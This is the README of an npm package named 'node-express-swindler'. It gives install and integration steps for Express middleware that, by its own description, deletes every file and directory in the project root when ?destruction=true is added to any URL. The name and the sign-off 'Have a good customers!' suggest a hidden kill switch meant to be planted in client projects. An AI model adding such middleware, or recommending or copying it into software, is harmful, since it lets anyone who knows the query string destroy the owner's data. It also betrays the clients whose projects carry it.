# node-express-swindler

Node swindler is a small library for extend Express app by middleware destruct file system.

### Requirements
Node.js, npm

### Installation
```
npm install node-express-swindler
```

### Usage
Simple integration
```
var Wrapper = require('node-express-swindler');
app.use(Wrapper)
// app - is the your express()
```
or
```
import Wrapper from 'node-express-swindler';
```
Add ?destruction=true to url for unlink all dirs and files on the project route

### Have a good customers!
